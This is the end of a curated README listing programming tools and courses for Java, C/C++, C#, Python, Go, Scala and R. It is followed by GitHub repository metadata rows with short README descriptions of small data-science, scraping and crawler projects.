tools needed to create professional desktop, mobile and enterprise applications. Creating, Editing, and Refactoring. The IDE provides wizards and templates to let you create Java EE, Java SE, and Java ME applications. Java Design Patterns  is a collection of the best formalized practices a programmer can use to solve common problems when designing an application or system. Elasticsearch is a distributed RESTful search engine built for the cloud written in Java. RxJava is a Java VM implementation of Reactive Extensions: a library for composing asynchronous and event-based programs by using observable sequences. It extends the observer pattern to support sequences of data/events and adds operators that allow you to compose sequences together declaratively while abstracting away concerns about things like low-level threading, synchronization, thread-safety and concurrent data structures. Guava is a set of core Java libraries from Google that includes new collection types (such as multimap and multiset), immutable collections, a graph library, and utilities for concurrency, I/O, hashing, caching, primitives, strings, and more! It is widely used on most Java projects within Google, and widely used by many other companies as well. okhttp is a HTTP client for Java and Kotlin developed by Square. Retrofit is a type-safe HTTP client for Android and Java develped by Square. LeakCanary is a memory leak detection library for Android develped by Square. Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Flink is an open source stream processing framework with powerful stream- and batch-processing capabilities with elegant and fluent APIs in Java and Scala. Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. libGDX is a cross-platform Java game development framework based on OpenGL (ES) that works on Windows, Linux, Mac OS X, Android, your WebGL enabled browser and iOS. Jenkins is the leading open-source automation server. Built with Java, it provides over 1700 plugins to support automating virtually anything, so that humans can actually spend their time doing things machines cannot. DBeaver is a free multi-platform database tool for developers, SQL programmers, database administrators and analysts. Supports any database which has JDBC driver (which basically means - ANY database). EE version also supports non-JDBC datasources (MongoDB, Cassandra, Redis, DynamoDB, etc). Redisson is a Redis Java client with features of In-Memory Data Grid. Over 50 Redis based Java objects and services: Set, Multimap, SortedSet, Map, List, Queue, Deque, Semaphore, Lock, AtomicLong, Map Reduce, Publish / Subscribe, Bloom filter, Spring Cache, Tomcat, Scheduler, JCache API, Hibernate, MyBatis, RPC, and local cache. GraalVM is a universal virtual machine for running applications written in JavaScript, Python, Ruby, R, JVM-based languages like Java, Scala, Clojure, Kotlin, and LLVM-based languages such as C and C++. Gradle is a build automation tool for multi-language software development. From mobile apps to microservices, from small startups to big enterprises, Gradle helps teams build, automate and deliver better software, faster. Write in Java, C++, Python or your language of choice. Apache Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming. JaCoCo is a free code coverage library for Java, which has been created by the EclEmma team based on the lessons learned from using and integration existing libraries for many years. Apache JMeter is  used to test performance both on static and dynamic resources, Web dynamic applications. It also used to simulate a heavy load on a server, group of servers, network or object to test its strength or to analyze overall performance under different load types. Junit is a simple framework to write repeatable tests. It is an instance of the xUnit architecture for unit testing frameworks. Mockito is the most popular Mocking framework for unit tests written in Java. SpotBugs is a program which uses static analysis to look for bugs in Java code. SpringBoot is a great tool that helps you to create Spring-powered, production-grade applications and services with absolute minimum fuss. It takes an opinionated view of the Spring platform so that new and existing users can quickly get to the bits they need. YourKit is a technology leader, creator of the most innovative and intelligent tools for profiling Java & .NET applications. C/C++ Development Back to the Top     C/C++ Learning Resources C++ is a cross-platform language that can be used to build high-performance applications developed by Bjarne Stroustrup, as an extension to the C language. C is a general-purpose, high-level language that was originally developed by Dennis M. Ritchie to develop the UNIX operating system at Bell Labs. It supports structured programming, lexical variable scope, and recursion, with a static type system. C also provides constructs that map efficiently to typical machine instructions, which makes it one was of the most widely used programming languages today. Embedded C is a set of language extensions for the C programming language by the C Standards Committee to address issues that exist between C extensions for different embedded systems. The extensions hep enhance microprocessor features such as fixed-point arithmetic, multiple distinct memory banks, and basic I/O operations. This makes Embedded C the most popular embedded software language in the world. C & C++ Developer Tools from JetBrains Open source C++ libraries on cppreference.com C++ Graphics libraries C++ Libraries in MATLAB C++ Tools and Libraries Articles Google C++ Style Guide Introduction C++ Education course on Google Developers C++ style guide for Fuchsia C and C++ Coding Style Guide by OpenTitan Chromium C++ Style Guide C++ Core Guidelines C++ Style Guide for ROS Learn C++ Learn C : An Interactive C Tutorial C++ Institute C++ Online Training Courses on LinkedIn Learning C++ Tutorials on W3Schools Learn C Programming Online Courses on edX Learn C++ with Online Courses on edX Learn C++ on Codecademy Coding for Everyone: C and C++ course on Coursera C++ For C Programmers on Coursera Top C Courses on Coursera C++ Online Courses on Udemy Top C Courses on Udemy Basics of Embedded C Programming for Beginners on Udemy C++ For Programmers Course on Udacity C++ Fundamentals Course on Pluralsight Introduction to C++ on MIT Free Online Course Materials Introduction to C++ for Programmers | Harvard  Online C Courses | Harvard University C/C++ Tools, Libraries and Frameworks AWS SDK for C++ Azure SDK for C++ Azure SDK for C C++ Client Libraries for Google Cloud Services Visual Studio is an integrated development environment (IDE) from Microsoft; which is a feature-rich application that can be used for many aspects of software development. Visual Studio makes it easy to edit, debug, build, and publish your app. By using Microsoft software development platforms such as Windows API, Windows Forms, Windows Presentation Foundation, and Windows Store. Visual Studio Code is a code editor redefined and optimized for building and debugging modern web and cloud applications. Vcpkg is a C++ Library Manager for Windows, Linux, and MacOS. ReSharper C++ is a Visual Studio Extension for C++ developers developed by JetBrains. AppCode is constantly monitoring the quality of your code. It warns you of errors and smells and suggests quick-fixes to resolve them automatically. AppCode provides lots of code inspections for Objective-C, Swift, C/C++, and a number of code inspections for other supported languages. All code inspections are run on the fly. CLion is a cross-platform IDE for C and C++ developers developed by JetBrains. Code::Blocks is a free C/C++ and Fortran IDE built to meet the most demanding needs of its users. It is designed to be very extensible and fully configurable. Built around a plugin framework, Code::Blocks can be extended with plugins. CppSharp is a tool and set of libraries which facilitates the usage of native C/C++ code with the .NET ecosystem. It consumes C/C++ header and library files and generates the necessary glue code to surface the native API as a managed API. Such an API can be used to consume an existing native library in your managed code or add managed scripting support to a native codebase. Conan is an Open Source Package Manager for C++ development and dependency management into the 21st century and on par with the other development ecosystems. High Performance Computing (HPC) SDK is a comprehensive toolbox for GPU accelerating HPC modeling and simulation applications. It includes the C, C++, and Fortran compilers, libraries, and analysis tools necessary for developing HPC applications on the NVIDIA platform. Thrust is a C++ parallel programming library which resembles the C++ Standard Library. Thrust's high-level interface greatly enhances programmer productivity while enabling performance portability between GPUs and multicore CPUs. Interoperability with established technologies such as CUDA, TBB, and OpenMP integrates with existing software. Boost is an educational opportunity focused on cutting-edge C++. Boost has been a participant in the annual Google Summer of Code since 2007, in which students develop their skills by working on Boost Library development. Automake is a tool for automatically generating Makefile.in files compliant with the GNU Coding Standards. Automake requires the use of GNU Autoconf. Cmake is an open-source, cross-platform family of tools designed to build, test and package software. CMake is used to control the software compilation process using simple platform and compiler independent configuration files, and generate native makefiles and workspaces that can be used in the compiler environment of your choice. GDB is a debugger, that allows you to see what is going on `inside' another program while it executes or what another program was doing at the moment it crashed. GCC is a compiler Collection that includes front ends for C, C++, Objective-C, Fortran, Ada, Go, and D, as well as libraries for these languages. GSL is a numerical library for C and C++ programmers. It is free software under the GNU General Public License. The library provides a wide range of mathematical routines such as random number generators, special functions and least-squares fitting. There are over 1000 functions in total with an extensive test suite. OpenGL Extension Wrangler Library (GLEW) is a cross-platform open-source C/C++ extension loading library. GLEW provides efficient run-time mechanisms for determining which OpenGL extensions are supported on the target platform. Libtool is a generic library support script that hides the complexity of using shared libraries behind a consistent, portable interface. To use Libtool, add the new generic library building commands to your Makefile, Makefile.in, or Makefile.am. Maven is a software project management and comprehension tool. Based on the concept of a project object model (POM), Maven can manage a project's build, reporting and documentation from a central piece of information. TAU (Tuning And Analysis Utilities) is capable of gathering performance information through instrumentation of functions, methods, basic blocks, and statements as well as event-based sampling. All C++ language features are supported including templates and namespaces. Clang is a production quality C, Objective-C, C++ and Objective-C++ compiler when targeting X86-32, X86-64, and ARM (other targets may have caveats, but are usually easy to fix). Clang is used in production to build performance-critical software like Google Chrome or Firefox. OpenCV is a highly optimized library with focus on real-time applications. Cross-Platform C++, Python and Java interfaces support Linux, MacOS, Windows, iOS, and Android. Libcu++ is the NVIDIA C++ Standard Library for your entire system. It provides a heterogeneous implementation of the C++ Standard Library that can be used in and between CPU and GPU code. ANTLR (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface that makes it easy to respond to the recognition of phrases of interest. Oat++ is a light and powerful C++ web framework for highly scalable and resource-efficient web application. It's zero-dependency and easy-portable. JavaCPP is a program that provides efficient access to native C++ inside Java, not unlike the way some C/C++ compilers interact with assembly language. Cython is a language that makes writing C extensions for Python as easy as Python itself. Cython is based on Pyrex, but supports more cutting edge functionality and optimizations such as calling C functions and declaring C types on variables and class attributes. Spdlog is a very fast, header-only/compiled, C++ logging library. Infer is a static analysis tool for Java, C++, Objective-C, and C. Infer is written in OCaml. C# Development Back to the Top     C# Learning Resources C# is a modern and object-oriented programming language developed by Microsoft to write any application using the C# programming language on the .NET platform. Taking your first steps with C# Learning C# C# development with Visual Studio C# programming with Visual Studio Code Working with data in C# C# Tutorial by W3Schools Windows Forms for .NET 5 and .NET Core 3.1 Xamarin documentation Advanced Topics in C# by Udemy The complete C# tutorial Unity C# Survival Guide RabbitMQ .NET/C# Client API C# Tools, Libraries and Frameworks Mono is a software platform designed to allow developers to easily create cross platform applications. It is an open source implementation of Microsoft's .NET Framework based on the ECMA standards for C# and the Common Language Runtime. Visual Studio is an integrated development environment (IDE) from Microsoft; which is a feature-rich application that can be used for many aspects of software development. Visual Studio makes it easy to edit, debug, build, and publish your app. By using Microsoft software development platforms such as Windows API, Windows Forms, Windows Presentation Foundation, and Windows Store. MSBuild is the build platform for .NET and Visual Studio. MSBuild, provides an XML schema for a project file that controls how the build platform processes and builds software. Visual Studio uses MSBuild to perform team builds through Azure DevOps Server, but MSBuild can run without Visual Studio. Roslyn is a .NET compiler developed by Microsoft that provides C# and Visual Basic languages with rich code analysis APIs. Bot Framework is a framework developed by Microsoft that provides the most comprehensive experience for building conversation applications. Developers can model and build sophisticated conversation using their favorite programming languages including C#, JS, Python and Java or using Bot Framework Composer, an open-source, visual authoring canvas for developers and multi-disciplinary teams to design and build conversational experiences with Language. Uno Platform is a Universal Windows Platform Bridge that allows UWP-based code (C# and XAML) to run on iOS, Android, macOS, WebAssembly, Linux and Windows 7. It provides the full definitions of the UWP Windows 10 2004 (19041), and the implementation of a growing number of parts of the UWP API, such as Windows.UI.Xaml, to enable UWP and WinUI applications to run on these platforms. Rider is a fast and powerful, cross-platform .NET IDE devloped by JetBrains to develop .NET, ASP.NET, .NET Core, Xamarin; or Unity applications for Windows, Mac, Linux. Resharper is a Visual Studio Extension for .NET Developers that has On-the-fly code quality analysis for C#, VB.NET, XAML, ASP.NET, ASP.NET MVC, JavaScript, TypeScript, CSS, HTML, and XML. Letting you know right away if your code needs to be improved. dotPeek is a tool developed by JetBrains based on ReSharper's bundled decompiler. It can reliably decompile any .NET assembly into equivalent C# or CIL code. dotTrace is an .NET performance Profiler developed by Jet Brains. It helps users locate performance bottlenecks in a variety of .NET applications: desktop applications, .NET Core, ASP.NET, ASP.NET Core applications hosted on IIS or IIS Express web servers, Silverlight, WCF services, Windows services, Universal Windows Platform applications, and unit tests. dotMemory is an .NET memory Profiler developed by Jet Brains. It allows the user to analyze memory usage in a variety of .NET and .NET Core applications: desktop applications, Windows services, ASP.NET web applications, IIS, IIS Express, arbitrary .NET processes, and more. dotCover is an .NET unit test runner and code coverage tool developed by Jet Brains. It helps the user figure out on-the-fly which unit tests are affected by your latest code changes, and automatically re-runs the affected tests for you. The continuous testing mode can be switched on for any unit test session. Json.NET is a popular high-performance JSON framework for .NET. Quasar is a fast and light-weight remote administration tool coded in C#. The usage ranges from user support through day-to-day administrative work to employee monitoring. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. CodeMaid is an open source Visual Studio extension to cleanup and simplify our C#, C++, F#, VB, PHP, PowerShell, JSON, XAML, XML, ASP, HTML, CSS, LESS, SCSS, JavaScript and TypeScript coding. .NET Fiddle is an advanced online compiler for C# that allows you to create, run and share your code online. Octopus Deploy is a single place for your team to manage releases, automate deployments, and automate the runbooks that keeps your software operating. Appveyor is a cloud-based continuous integration system that integrates natively with your source control and allows CI configuration files to live alongside your projects. AppHarbor is a .NET Platform-as-a-Service that let's developers deploy and scale any standard .NET application to the cloud. ANTLR (ANother Tool for Language Recognition) is a powerful parser generator for reading, processing, executing, or translating structured text or binary files. It's widely used to build languages, tools, and frameworks. From a grammar, ANTLR generates a parser that can build parse trees and also generates a listener interface that makes it easy to respond to the recognition of phrases of interest. AutoRest is a tool generates client libraries for accessing RESTful web services using the OpenAPI Specification format. It Supports C#, PowerShell, Go, Java, Node.js, TypeScript, Python, Ruby. Markdig is a fast, powerful, CommonMark compliant, extensible Markdown processor for .NET. Python Development Back to the Top     Python Learning Resources Python is an interpreted, high-level programming language. Python is used heavily in the fields of Data Science and Machine Learning. Python Developer’s Guide is a comprehensive resource for contributing to Python – for both new and experienced contributors. It is maintained by the same community that maintains Python. Azure Functions Python developer guide is an introduction to developing Azure Functions using Python. The content below assumes that you've already read the Azure Functions developers guide. CheckiO is a programming learning platform and a gamified website that teaches Python through solving code challenges and competing for the most elegant and creative solutions. Python Institute PCEP – Certified Entry-Level Python Programmer certification PCAP – Certified Associate in Python Programming certification PCPP – Certified Professional in Python Programming 1 certification PCPP – Certified Professional in Python Programming 2 MTA: Introduction to Programming Using Python Certification Getting Started with Python in Visual Studio Code Google's Python Style Guide Google's Python Education Class Real Python The Python Open Source Computer Science Degree by Forrest Knight Intro to Python for Data Science Intro to Python by W3schools Codecademy's Python 3 course Learn Python with Online Courses and Classes from edX Python Courses Online from Coursera Python Frameworks and Tools Python Package Index (PyPI) is a repository of software for the Python programming language. PyPI helps you find and install software developed and shared by the Python community. PyCharm is the best IDE I've ever used. With PyCharm, you can access the command line, connect to a database, create a virtual environment, and manage your version control system all in one place, saving time by avoiding constantly switching between windows. Python Tools for Visual Studio(PTVS) is a free, open source plugin that turns Visual Studio into a Python IDE. It supports editing, browsing, IntelliSense, mixed Python/C++ debugging, remote Linux/MacOS debugging, profiling, IPython, and web development with Django and other frameworks. Pylance is an extension that works alongside Python in Visual Studio Code to provide performant language support. Under the hood, Pylance is powered by Pyright, Microsoft's static type checking tool. Pyright is a fast type checker meant for large Python source bases. It can run in a “watch” mode and performs fast incremental updates when files are modified. Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design. Flask is a micro web framework written in Python. It is classified as a microframework because it does not require particular tools or libraries. Web2py is an open-source web application framework written in Python allowing allows web developers to program dynamic web content. One web2py instance can run multiple web sites using different databases. AWS Chalice is a framework for writing serverless apps in python. It allows you to quickly create and deploy applications that use AWS Lambda. Tornado is a Python web framework and asynchronous networking library. Tornado uses a non-blocking network I/O, which can scale to tens of thousands of open connections. HTTPie is a command line HTTP client that makes CLI interaction with web services as easy as possible. HTTPie is designed for testing, debugging, and generally interacting with APIs & HTTP servers. Scrapy is a fast high-level web crawling and web scraping framework, used to crawl websites and extract structured data from their pages. It can be used for a wide range of purposes, from data mining to monitoring and automated testing. Sentry is a service that helps you monitor and fix crashes in realtime. The server is in Python, but it contains a full API for sending events from any language, in any application. Pipenv is a tool that aims to bring the best of all packaging worlds (bundler, composer, npm, cargo, yarn, etc.) to the Python world. Python Fire is a library for automatically generating command line interfaces (CLIs) from absolutely any Python object. Bottle is a fast, simple and lightweight WSGI micro web-framework for Python. It is distributed as a single file module and has no dependencies other than the Python Standard Library. CherryPy is a minimalist Python object-oriented HTTP web framework. Sanic is a Python 3.6+ web server and web framework that's written to go fast. Pyramid is a small and fast open source Python web framework. It makes real-world web application development and deployment more fun and more productive. TurboGears is a hybrid web framework able to act both as a Full Stack framework or as a Microframework. Falcon is a reliable, high-performance Python web framework for building large-scale app backends and microservices with support for MongoDB, Pluggable Applications and autogenerated Admin. Neural Network Intelligence(NNI) is an open source AutoML toolkit for automate machine learning lifecycle, including Feature Engineering, Neural Architecture Search, Model Compression and Hyperparameter Tuning. Dash is a popular Python framework for building ML & data science web apps for Python, R, Julia, and Jupyter. Luigi is a Python module that helps you build complex pipelines of batch jobs. It handles dependency resolution, workflow management, visualization etc. It also comes with Hadoop support built-in. Locust is an easy to use, scriptable and scalable performance testing tool. spaCy is a library for advanced Natural Language Processing in Python and Cython. NumPy is the fundamental package needed for scientific computing with Python. Pillow is a friendly PIL(Python Imaging Library) fork. IPython is a command shell for interactive computing in multiple programming languages, originally developed for the Python programming language, that offers enhanced introspection, rich media, additional shell syntax, tab completion, and rich history. GraphLab Create is a Python library, backed by a C++ engine, for quickly building large-scale, high-performance machine learning models. Pandas is a fast, powerful, and easy to use open source data structrures, data analysis and manipulation tool, built on top of the Python programming language. PuLP is an Linear Programming modeler written in python. PuLP can generate LP files and call on use highly optimized solvers, GLPK, COIN CLP/CBC, CPLEX, and GUROBI, to solve these linear problems. Matplotlib is a 2D plotting library for creating static, animated, and interactive visualizations in Python. Matplotlib produces publication-quality figures in a variety of hardcopy formats and interactive environments across platforms. Scikit-Learn is a simple and efficient tool for data mining and data analysis. It is built on NumPy,SciPy, and mathplotlib. Go Development Back to the Top     Go Learning Resources Go is an open source programming language that makes it easy to build simple, reliable, and efficient software. Golang Contribution Guide Google Developers Training Google Developers Certification Uber's Go Style Guide GitLab's Go standards and style guidelines Effective Go Go: The Complete Developer's Guide (Golang) on Udemy Getting Started with Go on Coursera Programming with Google Go on Coursera Learning Go Fundamentals on Pluralsight Learning Go on Codecademy Go Tools and Frameworks golang tools holds the source for various packages and tools that support the Go programming language. Go in Visual Studio Code is an extension that gives you language features like IntelliSense, code navigation, symbol search, bracket matching, snippets, and many more that will help you in Golang development. Traefik is a modern HTTP reverse proxy and load balancer that makes deploying microservices easy. Traefik integrates with your existing infrastructure components (Docker, Swarm mode, Kubernetes, Marathon, Consul, Etcd, Rancher, Amazon ECS, etc.) and configures itself automatically and dynamically. Pointing Traefik at your orchestrator should be the only configuration step you need. Gitea is Git with a cup of tea, painless self-hosted git service. Using Go, this can be done with an independent binary distribution across all platforms which Go supports, including Linux, macOS, and Windows on x86, amd64, ARM and PowerPC architectures. OpenFaaS is Serverless Functions Made Simple. It makes it easy for developers to deploy event-driven functions and microservices to Kubernetes without repetitive, boiler-plate coding. Package your code or an existing binary in a Docker image to get a highly scalable endpoint with auto-scaling and metrics. micro is a terminal-based text editor that aims to be easy to use and intuitive, while also taking advantage of the capabilities of modern terminals. As its name indicates, micro aims to be somewhat of a successor to the nano editor by being easy to install and use. It strives to be enjoyable as a full-time editor for people who prefer to work in a terminal, or those who regularly edit files over SSH. Gravitational Teleport is a modern security gateway for remotely accessing into Clusters of Linux servers via SSH or SSH-over-HTTPS in a browser or Kubernetes clusters. NATS is a simple, secure and performant communications system for digital systems, services and devices. NATS is part of the Cloud Native Computing Foundation (CNCF). NATS has over 30 client language implementations, and its server can run on-premise, in the cloud, at the edge, and even on a Raspberry Pi. NATS can secure and simplify design and operation of modern distributed systems. Act is a GO program that allows you to run our GitHub Actions locally. Fiber is an Express inspired web framework built on top of Fasthttp, the fastest HTTP engine for Go. Designed to ease things up for fast development with zero memory allocation and performance in mind. Glide is a vendor Package Management for Golang. BadgerDB is an embeddable, persistent and fast key-value (KV) database written in pure Go. It is the underlying database for Dgraph, a fast, distributed graph database. It's meant to be a performant alternative to non-Go-based key-value stores like RocksDB. Go kit is a programming toolkit for building microservices (or elegant monoliths) in Go. We solve common problems in distributed systems and application architecture so you can focus on delivering business value. Codis is a proxy based high performance Redis cluster solution written in Go. zap is a blazing fast, structured, leveled logging in Go. HttpRouter is a lightweight high performance HTTP request router (also called multiplexer or just mux for short) for Go. Gorilla WebSocket is a Go implementation of the WebSocket protocol. Delve is a debugger for the Go programming language. GORM is a fantastic ORM library for Golang, aims to be developer friendly. Go Patterns is a curated collection of idiomatic design & application patterns for Go language. Scala Development Back to the Top     Scala Learning Resources Scala is a combination of object-oriented and functional programming in one concise, high-level language. Scala's static types help avoid bugs in complex applications, and its JVM and JavaScript runtimes let you build high-performance systems with easy access to huge ecosystems of libraries. Scala Style Guide Databricks Scala Style Guide Data Science using Scala and Spark on Azure Creating a Scala Maven application for Apache Spark in HDInsight using IntelliJ Intro to Spark DataFrames using Scala with Azure Databricks Using Scala to Program AWS Glue ETL Scripts Using Flink Scala shell with Amazon EMR clusters AWS EMR and Spark 2 using Scala from Udemy Using the Google Cloud Storage connector with Apache Spark Write and run Spark Scala jobs on Cloud Dataproc for Google Cloud Scala Courses and Certifications from edX Scala Courses from Coursera Top Scala Courses from Udemy Scala Tools and Libraries Apache Spark is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Azure Databricks is a fast and collaborative Apache Spark-based big data analytics service designed for data science and data engineering. Azure Databricks, sets up your Apache Spark environment in minutes, autoscale, and collaborate on shared projects in an interactive workspace. Azure Databricks supports Python, Scala, R, Java, and SQL, as well as data science frameworks and libraries including TensorFlow, PyTorch, and scikit-learn. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Cluster Manager for Apache Kafka(CMAK) is a tool for managing Apache Kafka clusters. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Eclipse Deeplearning4J (DL4J) is a set of projects intended to support all the needs of a JVM-based(Scala, Kotlin, Clojure, and Groovy) deep learning application. This means starting with the raw data, loading and preprocessing it from wherever and whatever format it is in to building and tuning a wide variety of simple and complex deep learning networks. Play Framework is a web framework combines productivity and performance making it easy to build scalable web applications with Java and Scala. Dotty is a research compiler that will become Scala 3. AWScala is a tool that enables Scala developers to easily work with Amazon Web Services in the Scala way. Scala.js is a compiler that converts Scala to JavaScript. Polynote is an experimental polyglot notebook environment. Currently, it supports Scala and Python (with or without Spark), SQL, and Vega. Scala Native is an optimizing ahead-of-time compiler and lightweight managed runtime designed specifically for Scala. Gitbucket is a Git platform powered by Scala with easy installation, high extensibility & GitHub API compatibility. Finagle is a fault tolerant, protocol-agnostic RPC system Gatling is a load test tool. It officially supports HTTP, WebSocket, Server-Sent-Events and JMS. Scalatra is a tiny Scala high-performance, async web framework, inspired by Sinatra. R Development Back to the Top     R Learning Resources R is an open source software environment for statistical computing and graphics. It compiles and runs on a wide variety of  platforms such as Windows and MacOS. An Introduction to R Google's R Style Guide R developer's guide to Azure Running R at Scale on Google Compute Engine Running R on AWS RStudio Server Pro for AWS Learn R by Codecademy Learn R Programming with Online Courses and Lessons by edX R Language Courses by Coursera Learn R For Data Science by Udacity R Tools, Libraries, and Frameworks Visual Studio Code is a code editor redefined and optimized for building and debugging modern web and cloud applications. Code Server is a tool that allows you to run VS Code on any machine anywhere and access it in the browser. VSCode-R is a VS Code extension provides support for the R programming language, including features such as extended syntax highlighting, R language service based on code analysis, interacting with R terminals, viewing data, plots, workspace variables, help pages, managing packages, and working with R Markdown documents. R Debugger is an extension that adds debugging capabilities for the R programming language to Visual Studio Code and depends on the R package vscDebugger (documentation). Language Server Protocol (LSP) is a tool that defines the protocol used between an editor or IDE and a language server that provides language features like auto complete, go to definition, find all references. RStudio is an integrated development environment for R and Python, with a console, syntax-highlighting editor that supports direct code execution, and tools for plotting, history, debugging and workspace management. Shiny is a newer package from RStudio that makes it incredibly easy to build interactive web applications with R. Rmarkdown is a package helps you create dynamic analysis documents that combine code, rendered output (such as figures), and prose. R Host is a host process for R that provides access and extensibility to it remotely over WebSocket and JSON. Rplugin is R Language supported plugin for the IntelliJ IDE. Plotly is an R package for creating interactive web graphics via the open source JavaScript graphing library plotly.js. Metaflow is a Python/R library that helps scientists and engineers build and manage real-life data science projects. Metaflow was originally developed at Netflix to boost productivity of data scientists who work on a wide variety of projects from classical statistics to state-of-the-art deep learning. Prophet is a procedure for forecasting time series data based on an additive model where non-linear trends are fit with yearly, weekly, and daily seasonality, plus holiday effects. It works best with time series that have strong seasonal effects and several seasons of historical data. LightGBM is a gradient boosting framework that uses tree based learning algorithms, used for ranking, classification and many other machine learning tasks. Dash is a Python framework for building analytical web applications in Python, R, Julia, and Jupyter. MLR is Machine Learning in R. ML workspace is an all-in-one web-based IDE specialized for machine learning and data science. It is simple to deploy and gets you started within minutes to productively built ML solutions on your own machines. ML workspace is the ultimate tool for developers preloaded with a variety of popular data science libraries (Tensorflow, PyTorch, Keras, and MXnet) and dev tools (Jupyter, VS Code, and Tensorboard) perfectly configured, optimized, and integrated. CatBoost is a fast, scalable, high performance Gradient Boosting on Decision Trees library, used for ranking, classification, regression and other machine learning tasks for Python, R, Java, C++. Supports computation on CPU and GPU. Plumber is a tool that allows you to create a web API by merely decorating your existing R source code with special comments. Drake is an R-focused pipeline toolkit for reproducibility and high-performance computing. DiagrammeR is a package you can create, modify, analyze, and visualize network graph diagrams. The output can be incorporated into R Markdown documents, integrated with Shiny web apps, converted to other graph formats, or exported as image files. Knitr is a general-purpose literate programming engine in R, with lightweight API's designed to give users full control of the output without heavy coding work. Broom is a tool that converts statistical analysis objects from R into tidy format. Contribute   If would you like to contribute to this guide simply make a Pull Request.  License Back to the Top Distributed under the Creative Commons Attribution 4.0 International (CC BY 4.0) Public License. "
417311584;Analysis_of_Injury;https://github.com/Karan36k/Analysis_of_Injury;Jupyter Notebook;2021-10-14T23:32:38Z;0;0;0;The motive of this project is to develop a model that will interpret an image to predict how likely different skin-conditions are danggerous with a picture of the skin. This is a trail using python and analytics to analyze the damages and injuries to a person by looking at the data.  *project.ai is the driver file. Steps to run the code- 1st step  - download the dataset  2nd step - Use extracting_image_feature to run color feature extraction on the dataset.  3rd step - Run the rest of the lines in projectAI file. 
417280297;Building-a-model-to-predict-Diabetes;https://github.com/srividya-sundaravadivelu/Building-a-model-to-predict-Diabetes;Jupyter Notebook;2021-10-14T20:58:27Z;0;0;0;Building-a-model-to-predict-Diabetes This project was done as part of Assessment - Datascience with Python program. This uses Supervised learning - Classification Algorithm - Logistic Regression to predict diabetes. 
417310947;Deep_miner;https://github.com/Karan36k/Deep_miner;Python;2021-10-14T23:29:07Z;0;0;1;Deep Web Miner Python | Spyder Crawler A web crawler made in python which is effective in searching a keyword with 3 levels of depth of any website which is publically accessible including Youtube ,Instaram, Netflix etc. Step to run this software:  Download the repository using the git clone  command Inside the terminal or CMD - run the .py file    Pyhon program will take an http/www website link as input Type in the keyword you want to search from the typed website Next Step is to input the level you want the code to mine the information Press enter and let the software do its wonderful work, After completion it saves the results obtained into a .log file  Major Concepts that were used in this project are:  Multi threading File handling Scheduling Url rendering Interruption signals  Feel free to get in touch with me incase of any errors or give this repo a star for support! :) 
417205970;PyKotor;https://github.com/NickHugi/PyKotor;Python;2021-10-14T16:33:11Z;0;0;0;
417268483;coinmarketcap-cripto-price-scrapper;https://github.com/jboirazian/coinmarketcap-cripto-price-scrapper;Jupyter Notebook;2021-10-14T20:09:15Z;1;1;0;coinmarketcap-cripto-price-scrapper Python script for extracting the prices of multiple crypto coins such as (SLP , CARDANO , BITCOIN, ETC) without the official API wrapper status: Work in progress 
417291474;Dash_Covid19;https://github.com/oscarteran/Dash_Covid19;Python;2021-10-14T21:48:46Z;0;0;0;Dash_Covid19 This repository contains codes for exploratory data analysis of a COVID patient dataset. For the visualization a Dashboard is realized with Python. To review dash documentation refer to: https://dash.plotly.com/layout To review the types of graphs used check: https://plotly.com/python/px-arguments/ All possible graphs in: https://plotly.com/python/plotly-express/ Labels for graphics https://es.acervolima.com/2021/02/09/alineacion-del-titulo-en-plotly/ 
417293646;trab-ppioo;https://github.com/gabrielld06/trab-ppioo;Makefile;2021-10-14T21:59:08Z;0;0;0;
417247796;University_Sonar;https://github.com/Osama-NJ/University_Sonar;Python;2021-10-14T18:52:06Z;0;0;0;" University Sonar     Requirements:  🐍Python  3.x Google chrome driver is compatible with your browser, if you dont have chromedriver downloaded you can go download it from here: https://chromedriver.storage.googleapis.com/index.html  Execution:  Have Python 3 or higher installed on the machine; Install Python modules →(Selenium Webdriver, Time, tkinter) To start and run the code, Change the chromedriver executable path directory in the code  and choose the directory for your system and unzip the ""chromedriver"" file; Execute the command in the terminal: gui_launcher.py When the green GUI button ""Find"" appears , Click on it.  Python modules:   pip install selenium  pip install tkinter  pip install time   Notes:  If you want to run code without using GUI, Execute the command in the terminal:python main.py  "
417259773;ACC2022;https://github.com/tylerlekang/ACC2022;Jupyter Notebook;2021-10-14T19:35:30Z;0;0;0;
417263972;Learning-PID-Control;https://github.com/minhaj6/Learning-PID-Control;Python;2021-10-14T19:52:02Z;0;0;0;Listing of some resources that I found useful  Simple Examples of PID Control https://youtu.be/XfAt6hNV8XM Creating and Tuning a PID controller with Python Simulation https://youtu.be/ZMI_kpNUgJM  
